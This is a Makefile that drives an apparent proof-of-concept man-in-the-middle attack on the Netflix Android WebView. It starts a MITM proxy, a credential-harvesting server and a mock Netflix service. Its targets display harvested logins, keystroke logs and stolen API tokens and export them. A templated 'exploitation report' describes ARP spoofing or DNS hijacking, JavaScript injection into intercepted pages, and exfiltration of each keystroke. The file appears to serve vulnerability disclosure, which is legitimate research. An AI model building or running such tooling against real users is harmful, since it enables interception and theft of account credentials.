.PHONY: help setup build up down logs clean test monitor dashboard

help:
	@echo "╔════════════════════════════════════════════════════════════════╗"
	@echo "║  Netflix MITM PoC - Available Commands                        ║"
	@echo "╚════════════════════════════════════════════════════════════════╝"
	@echo ""
	@echo "Setup & Initialization:"
	@echo "  make setup        - Initialize directories and files"
	@echo "  make build        - Build Docker images"
	@echo "  make init         - Setup + Build"
	@echo ""
	@echo "Running the Attack:"
	@echo "  make up           - Start all Docker services"
	@echo "  make down         - Stop all Docker services"
	@echo "  make test         - Run attack simulation test"
	@echo "  make full         - Setup, build, start, and test (complete)"
	@echo ""
	@echo "Monitoring & Analysis:"
	@echo "  make logs         - Stream all logs"
	@echo "  make monitor      - Monitor harvested credentials (real-time)"
	@echo "  make dashboard    - Open dashboard in browser"
	@echo "  make status       - Check service status"
	@echo ""
	@echo "Credentials & Evidence:"
	@echo "  make creds        - Show all harvested credentials"
	@echo "  make keystrokes   - Show keystroke logs"
	@echo "  make tokens       - Show captured API tokens"
	@echo "  make export       - Export all logs to export_TIMESTAMP.tar.gz"
	@echo ""
	@echo "Cleanup:"
	@echo "  make clean        - Stop containers and remove volumes"
	@echo "  make prune        - Clean up ALL Docker artifacts"
	@echo ""
	@echo "Documentation:"
	@echo "  make readme       - Display README"
	@echo "  make device-guide - Display device connectivity guide"
	@echo ""

setup:
	@echo "[*] Setting up Netflix MITM PoC..."
	@chmod +x setup_mitm.sh
	@./setup_mitm.sh

build:
	@echo "[*] Building Docker images..."
	@docker-compose build --no-cache

init: setup build
	@echo "[+] Setup and build complete!"

up:
	@echo "[*] Starting Docker services..."
	@docker-compose up -d
	@sleep 3
	@echo "[+] Services started! Waiting for initialization..."
	@sleep 5
	@docker-compose ps
	@echo ""
	@echo "Services running:"
	@echo "  MITM Proxy:        http://localhost:8080"
	@echo "  Credential Server: http://localhost:8888"
	@echo "  Mock Netflix:      http://localhost:9999"
	@echo ""

down:
	@echo "[*] Stopping Docker services..."
	@docker-compose down
	@echo "[+] Services stopped"

test:
	@echo "[*] Running MITM attack test..."
	@echo ""
	@python3 test_mitm_client.py

logs:
	@echo "[*] Streaming logs from all services..."
	@docker-compose logs -f

monitor:
	@echo "[*] Monitoring harvested credentials (real-time)..."
	@echo "Press Ctrl+C to stop"
	@echo ""
	@watch -n 1 'echo "=== HARVESTED CREDENTIALS ===" && \
	            wc -l credential_logs/harvested_credentials.json && \
	            echo "" && \
	            echo "=== LATEST CREDENTIAL ===" && \
	            tail -1 credential_logs/harvested_credentials.json | jq . 2>/dev/null || echo "No credentials yet"'

dashboard:
	@echo "[*] Opening dashboard..."
	@open http://localhost:8888 2>/dev/null || \
	xdg-open http://localhost:8888 2>/dev/null || \
	echo "Open http://localhost:8888 in your browser"

status:
	@docker-compose ps
	@echo ""
	@echo "Service health:"
	@curl -s http://localhost:8080/health 2>/dev/null | jq . && echo "✓ MITM Proxy" || echo "✗ MITM Proxy"
	@curl -s http://localhost:8888/health | jq . && echo "✓ Credential Server" || echo "✗ Credential Server"
	@curl -s http://localhost:9999/health | jq . && echo "✓ Mock Netflix" || echo "✗ Mock Netflix"

creds:
	@echo "[*] Harvested Credentials"
	@echo "════════════════════════════════════════════════════════════════"
	@if [ -f credential_logs/harvested_credentials.json ]; then \
		wc -l credential_logs/harvested_credentials.json | awk '{print "Total credentials captured: " $$1}'; \
		echo ""; \
		cat credential_logs/harvested_credentials.json | jq .; \
	else \
		echo "No credentials harvested yet"; \
	fi

keystrokes:
	@echo "[*] Captured Keystrokes (passwords as they're typed)"
	@echo "════════════════════════════════════════════════════════════════"
	@if [ -f credential_logs/keystrokes.log ]; then \
		tail -30 credential_logs/keystrokes.log; \
	else \
		echo "No keystrokes logged yet"; \
	fi

tokens:
	@echo "[*] Captured API Tokens"
	@echo "════════════════════════════════════════════════════════════════"
	@if [ -f credential_logs/api_tokens.json ]; then \
		cat credential_logs/api_tokens.json | jq .; \
	else \
		echo "No tokens captured yet"; \
	fi

export:
	@echo "[*] Exporting all logs and evidence..."
	@mkdir -p export
	@tar -czf export_$$(date +%s).tar.gz \
		credential_logs/ \
		intercepted_data/ \
		mock_logs/
	@echo "[+] Exported to export_$$(date +%s).tar.gz"

clean:
	@echo "[*] Cleaning up containers and volumes..."
	@docker-compose down -v
	@echo "[+] Cleanup complete"

prune:
	@echo "[!] WARNING: This will remove ALL Docker containers and volumes"
	@read -p "Continue? (y/n) " -n 1 -r; \
	echo; \
	if [[ $$REPLY =~ ^[Yy]$$ ]]; then \
		docker-compose down -v; \
		docker system prune -f; \
		echo "[+] Docker pruned"; \
	fi

readme:
	@less POC_2_MITM_ATTACK_README.md

device-guide:
	@less DEVICE_CONNECTIVITY_GUIDE.md

# Compound targets
full: init up
	@sleep 10
	@echo ""
	@echo "[*] Running attack simulation..."
	@python3 test_mitm_client.py

quick: up
	@echo ""
	@echo "[*] Waiting for services to initialize..."
	@sleep 5
	@echo "[*] Running quick test..."
	@python3 test_mitm_client.py

# Development targets
dev: up
	@echo "[*] Starting in development mode..."
	@docker-compose logs -f

shell-mitm:
	@docker-compose exec mitm-proxy bash

shell-harvester:
	@docker-compose exec credential-server bash

shell-mock:
	@docker-compose exec mock-netflix bash

# Analysis targets
analyze:
	@echo "[*] Analyzing harvested data..."
	@echo ""
	@echo "=== STATISTICS ==="
	@echo "Total credentials: $$(wc -l < credential_logs/harvested_credentials.json 2>/dev/null || echo 0)"
	@echo "Keystrokes logged: $$(wc -l < credential_logs/keystrokes.log 2>/dev/null || echo 0)"
	@echo "API tokens: $$(wc -l < credential_logs/api_tokens.json 2>/dev/null || echo 0)"
	@echo ""
	@echo "=== EMAIL ADDRESSES ==="
	@grep -o '"email":"[^"]*"' credential_logs/harvested_credentials.json 2>/dev/null | cut -d: -f2 | sort | uniq || echo "None captured"
	@echo ""
	@echo "=== TIMESTAMP RANGE ==="
	@head -1 credential_logs/harvested_credentials.json | grep -o '"timestamp":"[^"]*"' | head -1
	@tail -1 credential_logs/harvested_credentials.json | grep -o '"timestamp":"[^"]*"' | tail -1

reset:
	@echo "[!] Resetting all logs and captured data..."
	@rm -f credential_logs/*.json credential_logs/*.log credential_logs/*.csv
	@rm -f intercepted_data/*.log
	@rm -f mock_logs/*.log
	@mkdir -p credential_logs intercepted_data mock_logs
	@echo "[+] Logs reset"

# Report generation
report:
	@echo "[*] Generating exploitation report..."
	@cat > EXPLOITATION_REPORT_$$(date +%Y%m%d_%H%M%S).md << 'EOF'
# Netflix MITM Attack PoC - Exploitation Report

**Generated:** $$(date)
**Vulnerability:** Missing Certificate Pinning (CWE-295)
**Severity:** CRITICAL (CVSS 9.1)

## Summary

Netflix Android WebView does not implement certificate pinning for HTTPS connections.
This allows Man-In-The-Middle attackers on the same network to intercept and modify
responses, injecting JavaScript to harvest login credentials.

## Exploitation Results

**Credentials Captured:** $$(wc -l < credential_logs/harvested_credentials.json 2>/dev/null || echo 0)
**Keystrokes Logged:** $$(wc -l < credential_logs/keystrokes.log 2>/dev/null || echo 0)
**API Tokens Stolen:** $$(wc -l < credential_logs/api_tokens.json 2>/dev/null || echo 0)

## Evidence

### Harvested Credentials
$$(cat credential_logs/harvested_credentials.json 2>/dev/null || echo "No credentials")

### Keystroke Logs
$$(tail credential_logs/keystrokes.log 2>/dev/null || echo "No keystrokes")

### API Tokens
$$(cat credential_logs/api_tokens.json 2>/dev/null || echo "No tokens")

## Attack Chain

1. Attacker gains network access (WiFi, ISP, cellular)
2. Performs ARP spoofing or DNS hijacking
3. Device traffic intercepted by MITM proxy
4. HTTPS response intercepted and modified
5. JavaScript payload injected into HTML
6. User types password, each keystroke logged
7. On form submission, credentials exfiltrated to attacker
8. User has no indication of compromise

## Remediation

Implement certificate pinning in WebView configuration.

---
**Status:** CONFIRMED CRITICAL VULNERABILITY
**Recommendation:** Immediate remediation required
EOF
	@echo "[+] Report generated: EXPLOITATION_REPORT_$$(date +%Y%m%d_%H%M%S).md"

.DEFAULT_GOAL := help
